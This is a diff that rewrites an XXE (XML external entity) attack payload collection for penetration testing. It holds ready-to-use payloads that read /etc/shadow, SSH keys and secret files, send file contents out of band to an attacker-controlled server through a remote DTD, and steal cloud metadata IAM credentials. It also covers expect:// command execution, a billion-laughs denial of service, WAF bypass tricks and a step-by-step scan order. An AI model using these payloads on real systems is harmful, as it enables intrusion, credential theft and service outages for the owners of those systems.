@@ -1,121 +1,290 @@
-<!-- ==================== PART 1: BASIC FILE READ ==================== -->
-<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
+# ============================================================
+#  XXE PAYLOAD COLLECTION - 2026 ULTIMATE (verified, de-duplicated)
+#  Replace: YOUR-SERVER  BURP-COLLABORATOR-SUBDOMAIN  YOUR-DNS
+#  Lab/authorized use only. Scan order + future-proof tree at the end.
+# ============================================================
 
-<!-- ==================== PART 2: BLIND XXE WITH OOB ==================== -->
-<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/xxe.dtd"> %xxe; ]>
-<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "https://YOUR-SERVER/xxe.dtd"> %xxe; ]>
-<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "//YOUR-SERVER/xxe.dtd"> %xxe; ]>
+# ---------------- 1. IN-BAND FILE READ (the two classics) ----------------
+<?xml version="1.0"?>
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<data>&xxe;</data>
 
-<!-- ==================== PART 3: ERROR-BASED XXE ==================== -->
-<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY % error "<!ENTITY error SYSTEM 'file:///nonexistent/%xxe;'>"> %error; ]>
-<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/xxe.dtd"> %xxe; ]>
+<?xml version="1.0"?>
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
+<data>&xxe;</data>
 
-<!-- ==================== PART 4: PHP WRAPPERS ==================== -->
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../config/database.php"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../.env"> ]>
+# ---------------- 2. GOLDEN FILE TARGETS (value-density order) ----------------
+file:///etc/passwd
+file:///etc/hosts
+file:///etc/hostname
+file:///etc/shadow
+file:///etc/ssh/sshd_config
+file:///root/.ssh/id_rsa
+file:///proc/self/environ
+file:///proc/self/cmdline
+file:///proc/self/cwd/.env
+file:///proc/sys/kernel/random/boot_id
+file:///proc/net/route
+file:///etc/resolv.conf              # DNS infra + domain hints
+file:///etc/exports                  # NFS mounts
+file:///var/www/html/config.php
+file:///home/*/.ssh/authorized_keys
+file:///c:/windows/win.ini
+file:///c:/windows/system32/drivers/etc/hosts
+file:///c:/inetpub/wwwroot/web.config
+file:///c:/users/*/AppData/Roaming/Microsoft/Credentials/*
+file:///etc/apache2/apache2.conf
+file:///etc/nginx/nginx.conf
+file:///opt/app/config/secrets.yml
+file:///app/config/secrets.yml
 
-<!-- ==================== PART 5: SSRF & METADATA ==================== -->
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:8080/admin"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://127.0.0.1:80"> ]>
+# ---------------- 3. BLIND OOB - DETECTION (fires a DNS/HTTP hit) ----------------
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
+<data>x</data>
+<!DOCTYPE data [ <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+<data>x</data>
+# collab budget: keep ONE detection payload, pair it with STEP 3 in the exfil file.
 
-<!-- ==================== PART 6: EXPECT RCE (PHP) ==================== -->
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "expect://id"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "expect://ls -la"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "expect://cat /etc/passwd"> ]>
+# ---------------- 4. BLIND OOB EXFIL - THE MONEY COMBO ----------------
+# REQUEST sent to target (php filter base64 keeps output exfil-safe):
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/exfil.dtd">
+  %remote;
+]>
+<data>&send;</data>
+# SERVER (host exfil.dtd, content in "XXE-exfil-server-side.dtd"):
+#   <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://YOUR-SERVER/?x=%file;'>">
+#   %all;
+# FILE read works for java raw too: change %file to file:///etc/passwd (no b64).
 
-<!-- ==================== PART 7: XINCLUDE BYPASS ==================== -->
-<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>
-<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///c:/windows/win.ini" parse="text"/></root>
+# ---------------- 5. BLIND ERROR-BASED (internal, libxml/PHP verified) ----------------
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+  %error;
+]>
+<data>x</data>
+# Result: "file:///nonexistent/root:x:0:0:..." leaks into the error line.
+# Use php filter for special chars:
+#   %file = php://filter/convert.base64-encode/resource=/etc/passwd
 
-<!-- ==================== PART 8: SVG XXE ==================== -->
-<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><xml xmlns=""><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></xml></foreignObject></svg>
-<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>
+# ---------------- 6. BLIND ERROR-BASED VIA EXTERNAL DTD (java/jaxp fallback) ----------------
+# REQUEST:
+<?xml version="1.0"?>
+<!DOCTYPE data [ <!ENTITY % remote SYSTEM "http://YOUR-SERVER/error.dtd"> %remote; ]>
+<data>x</data>
+# error.dtd (content in helper file): %file = file:///etc/... then %eval/%error chain.
+%remote;
 
-<!-- ==================== PART 9: SOAP/XMLRPC XXE ==================== -->
-<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://YOUR-SERVER/xxe.dtd"> %dtd;]><xxx/>]]></foo></soap:Body>
-<methodCall><methodName>test</methodName><params><param><value><struct><member><name><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><value>&xxe;</value></name></member></struct></value></param></params></methodCall>
+# ---------------- 7. XINCLUDE - BYPASSES DOCTYPE BLOCKING (2026-critical) ----------------
+# Modern parsers disable DTD entirely; XInclude is NOT DTD and often still enabled.
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="file:///etc/passwd" parse="text"/>
+</root>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="file:///c:/windows/win.ini" parse="text"/>
+</root>
+# XInclude -> internal SSRF (no entities needed):
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="http://169.254.169.254/latest/meta-data/" parse="text"/>
+</root>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="http://127.0.0.1:9200/_cat/indices" parse="text"/>
+</root>
+# XInclude via php wrapper (filter makes non-text files safe):
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="php://filter/convert.base64-encode/resource=/etc/passwd" parse="text"/>
+</root>
+# XInclude with data: URI (no file:// trust needed - known-content smuggle):
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="data:text/plain;base64,aGVsbG8gZXZpbA==" parse="text"/>
+</root>
 
-<!-- ==================== PART 10: JAR/WAR PROTOCOL (Java) ==================== -->
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "jar:http://YOUR-SERVER/xxe.jar!/xxe.dtd"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "https://YOUR-SERVER/xxe.jar!/xxe.dtd"> ]>
+# ---------------- 8. PHP WRAPPERS ----------------
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> ]>
+<data>&xxe;</data>
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<data>&xxe;</data>
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../config/database.php"> ]>
+<data>&xxe;</data>
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/.env"> ]>
+<data>&xxe;</data>
+# RCE when PHP "expect" extension is loaded:
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "expect://id"> ]>
+<data>&xxe;</data>
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "expect://ls%20-la"> ]>
+<data>&xxe;</data>
 
-<!-- ==================== PART 11: NETWORK PROTOCOLS ==================== -->
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "ftp://YOUR-SERVER:21/xxe"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "gopher://YOUR-SERVER:8080/_GET /xxe HTTP/1.0"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "dict://YOUR-SERVER:11211/xxe"> ]>
+# ---------------- 9. JAVA WRAPPERS ----------------
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "jar:http://YOUR-SERVER/xxe.jar!/exfil.dtd"> ]>
+<data>x</data>
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "ftps://YOUR-SERVER:2121/exfil.dtd"> ]>
+<data>x</data>
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "netdoc:///etc/passwd"> ]>
+<data>x</data>
 
-<!-- ==================== PART 12: DOS (BILLION LAUGHS) ==================== -->
-<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">]><root>&lol5;</root>
+# ---------------- 10. MULTI-PROTOCOL EGRESS (diverse egress paths) ----------------
+ftp://BURP-COLLABORATOR-SUBDOMAIN:21/x
+gopher://YOUR-SERVER:8080/_GET /x HTTP/1.0
+dict://YOUR-SERVER:11211/x
+https://YOUR-SERVER/x        # TLS egress (some egress filters only block http)
+jar:https://YOUR-SERVER/x.jar!/x
+# CRLF-in-URI variant to dodge strict host allows:
+http://BURP-COLLABORATOR-SUBDOMAIN%0a
 
-<!-- ==================== PART 13: ENCODED BYPASS ==================== -->
-<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
-<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/xxe.dtd"> %xxe; ]>
+# ---------------- 11. SSRF + CLOUD METADATA ----------------
+http://169.254.169.254/latest/meta-data/                          # AWS
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
+http://169.254.169.254/computeMetadata/v1/                       # GCP (needs X-Google-Metadata-Request header in real SSRF; XXE=GET only)
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure
+http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
+http://100.100.100.200/latest/meta-data/                          # Alibaba
+http://100.100.100.200/latest/meta-data/
+# FPGA/neighbours:
+http://169.254.169.254/latest/dynamic/instance-identity/document
+# IMDSv2 reality: if the instance enforces IMDSv2, GET-only XXE fails the token dance (PUT).
+#   Then you need a real SSRF primitive or a chained SSRF - raw entity GET won't read keys.
 
-<!-- ==================== PART 14: CDATA ESCAPE ==================== -->
-<!DOCTYPE test [<!ENTITY % start "<![CDATA["> <!ENTITY % end "]]>"> <!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY % all "<!ENTITY contents '%start;%xxe;%end;'>"> %all; ]><root>&contents;</root>
+# ---------------- 12. INTERNAL PORT PROBE (response-feedback) ----------------
+# Response text comes back for open ports, errors/blanks for closed:
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin"> ]>
+<data>&xxe;</data>
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://127.0.0.1:9200/"> ]>
+<data>&xxe;</data>
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://127.0.0.1:6379/"> ]>
+<data>&xxe;</data>
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://127.0.0.1:3306/"> ]>
+<data>&xxe;</data>
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://127.0.0.1:5984/"> ]>
+<data>&xxe;</data>
 
-<!-- ==================== PART 15: MULTI-PLATFORM ==================== -->
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> <!ENTITY xxe2 SYSTEM "file:///c:/windows/win.ini"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"> <!ENTITY xxe2 SYSTEM "expect://id"> ]>
+# ---------------- 13. SVG (image upload endpoint) ----------------
+<?xml version="1.0"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
+  <text x="0" y="15" font-size="10">&xxe;</text>
+</svg>
+# SVG carrying HTML/XSS via foreignObject (when served inline):
+<svg xmlns="http://www.w3.org/2000/svg">
+  <foreignObject>
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <img src="x" onerror="alert(document.domain)"/>
+    </div>
+  </foreignObject>
+</svg>
 
-<!-- ==================== PART 16: PARAMETER ENTITIES OOB ==================== -->
-<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/xxe.dtd"> %xxe; ]>
-<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://YOUR-SERVER/steal?data=%data;'>">%param1;%exfil;
+# ---------------- 14. OFFICE DOCS (docx/xlsx OOXML) ----------------
+# word/document.xml (inside a .docx/.pptx) or [Content_Types].xml | docProps/core.xml:
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<r>&xxe;</r>
+# Craft: unzip -d x doc.docx; edit target xml; zip again (libreoffice/nounzip compacts)
+#   -> upload the .docx; server-side OOXML parser (word, libreoffice, preview) resolves DTD.
+# xlsx variant (sharedStrings.xml):
+<?xml version="1.0"?>
+<!DOCTYPE sst [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><si><t>&xxe;</t></si></sst>
 
-<!-- ==================== PART 17: HTML ENTITY BYPASS ==================== -->
-&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"> ]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;
+# ---------------- 15. XSLT XXE (native transform - bypasses DOCTYPE block) ----------------
+<?xml version="1.0"?>
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
+  <xsl:template match="/">
+    <xsl:copy-of select="document('file:///etc/passwd')"/>
+  </xsl:template>
+</xsl:stylesheet>
+# Java/Xalan and PHP XSLT often honor document(); modern hardened stacks need exsl/node-set.
+# SSRF flavour:
+    <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>
 
-<!-- ==================== PART 18: UTF-16 BYPASS ==================== -->
-<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+# ---------------- 16. XML SCHEMA SSRF (no DTD at all) ----------------
+<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
+  <xs:include schemaLocation="http://YOUR-SERVER/evil.xsd"/>
+</xs:schema>
+<xs:import namespace="urn:x" schemaLocation="http://YOUR-SERVER/evil.xsd"/>
+# triggers an HTTP fetch to YOUR-SERVER -> OOB detection when everything else is locked.
 
-<!-- ==================== PART 19: WAF BYPASS SPACELESS ==================== -->
-<!DOCTYPE test[<!ENTITY xxe SYSTEM"file:///etc/passwd">]>
-<!DOCTYPE test[<!ENTITY%xxe SYSTEM"http://YOUR-SERVER/xxe.dtd">%xxe;]>
+# ---------------- 17. SOAP / SAML / XML-RPC LANDING ZONES ----------------
+# SOAP:
+<?xml version="1.0"?>
+<!DOCTYPE soap:Envelope [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body><foo>&xxe;</foo></soap:Body>
+</soap:Envelope>
+# SAML Response:
+<?xml version="1.0"?>
+<!DOCTYPE samlp:Response [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">&xxe;</samlp:Response>
+# XML-RPC:
+<?xml version="1.0"?>
+<!DOCTYPE methodCall [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<methodCall><methodName>test</methodName>
+  <params><param><value>&xxe;</value></param></params>
+</methodCall>
 
-<!-- ==================== PART 20: ADVANCED OOB WITH FTP ==================== -->
-<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "ftp://YOUR-SERVER:2121/xxe.dtd"> %xxe; ]>
+# ---------------- 18. XML-INSIDE-JSON (converter engines) ----------------
+# App parses JSON but converts to XML to process (oxml, wrapping): inject XML w/ DTD:
+{"xml": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>"}
+# Multipart mixed: send XML as a JSON value or bound param:
+"payload": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>"
 
-<!-- ==================== PART 21: DNS EXFILTRATION ==================== -->
-<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/xxe.dtd"> %xxe; ]>
-<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://%data;.YOUR-SERVER/'>">%param1;%exfil;
+# ---------------- 19. DoS (LAB ONLY - never on live) ----------------
+# TRUE billion laughs (levels to 9):
+<!DOCTYPE lol [
+ <!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]
+<lol>&lol9;</lol>
+# Quadratic blowup (same entity repeated, cheaper):
+<!DOCTYPE q [ <!ENTITY a "AAAAAAAAAAAAAAAAAAAA"> ]>
+<q>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</q>
 
-<!-- ==================== PART 22: MULTI-STAGE OOB ==================== -->
-<!DOCTYPE test [ <!ENTITY % stage1 SYSTEM "http://YOUR-SERVER/stage1.dtd"> %stage1; ]>
-<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % stage2 "<!ENTITY exfil SYSTEM 'http://YOUR-SERVER/steal?data=%data;'>">%stage2;%exfil;
+# ---------------- 20. WAF / PARSER BYPASS KIT ----------------
+# no-space compact (WAF tests whitespace):
+<!DOCTYPE data[<!ENTITY xxe SYSTEM"file:///etc/passwd">]>
+<!DOCTYPE data[<!ENTITY%xxe SYSTEM"http://BURP-COLLABORATOR-SUBDOMAIN">%xxe;]>
+# %-encoded parameter entity name (defeats "ENTITY %" signature scans):
+<!DOCTYPE data [ <!ENTITY &#37; xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+# UTF-16 whole-payload (some WAFs only match ASCII):
+<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
+# UTF-16 BOM + encoding (strip BOM first if the app injects it):
+<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+# CRLF inside the SYSTEM URI (dodges URI regex):
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN%0d%0a"> ]>
+# CDATA wrap to pass through markup filters:
+<![CDATA[<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>]]>
+# DOCTYPE inside the root (some parsers accept late DOCTYPE):
+<root><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;</root>
+# html-entity-encoded (double-decoding mazes):
+&lt;!DOCTYPE data [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;
+# parameter entity inside external DTD on a 2nd host (sandbox bypass):
+<!DOCTYPE data [ <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/payload2.dtd"> %dtd; ]>
 
-<!-- ==================== PART 23: XXE IN JSON (If JSON parser supports XML) ==================== -->
-{"xml":"<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"}
+# ---------------- 21. SCAN ORDER (2026-2030) ----------------
+# 1. Find XML input (SOAP/SAML/OOXML/SVG/XSLT/params) -> cookie/body/upload.
+# 2. DTD alive?  -> classic in-band file read OR blind OOB (section 3).
+# 3. DOCTYPE denied? -> XInclude (sec 7) -> XSLT document() (sec 15) -> xsd:include (sec 16).
+# 4. External DTD denied, entities on? -> error-based internal (sec 5/6).
+# 5. All parser-hardened? -> hit the OTHER xml consumers:
+#      Office uploads (sec 14), SVG endpoints (sec 13), SAML (sec 17),
+#      ImageMagick MSL, PDF X-Object, RSS/ATOM feeds, XML/JSON converters (sec 18).
+# 6. Egress blocked on http? -> ftp/gopher/https/dict, DNS-canary via dtd (sec 10).
 
-<!-- ==================== PART 24: XXE IN PARAMETER ==================== -->
-parameter=<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
-
-<!-- ==================== PART 25: ULTIMATE POLYGLOT ==================== -->
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root>test</root>
-
-<!-- ==================== PART 26: NO ROOT ELEMENT BYPASS ==================== -->
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://YOUR-SERVER/xxe"> ]>
-
-<!-- ==================== PART 27: ENTITY INJECTION IN ATTRIBUTE ==================== -->
-<root value="&xxe;"/>
-<element attr="&xxe;"/>
-
-<!-- ==================== PART 28: XXE WITH BASE64 (For binary files) ==================== -->
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> ]>
-
-<!-- ==================== PART 29: XXE WITH GZIP (For large files) ==================== -->
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "compress.zlib://file:///etc/passwd"> ]>
-
-<!-- ==================== PART 30: 2026 LATEST - CVE BASED ==================== -->
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data/"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///proc/self/cwd/.env"> ]>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///app/config/secrets.yml"> ]>
+# ---------------- 22. IMPACT LADDER (for reporting) ----------------
+# file read:      High  (configs/secrets/source)
+# SSRF/metadata:  High-Critical (cloud creds = total own)
+# RCE (expect):   Critical (php-expect only, rare)
+# blind only:     Medium-High (add OOB evidence + file read demo)
+# DoS:            Low-Medium (most programs won't pay; lab context only)
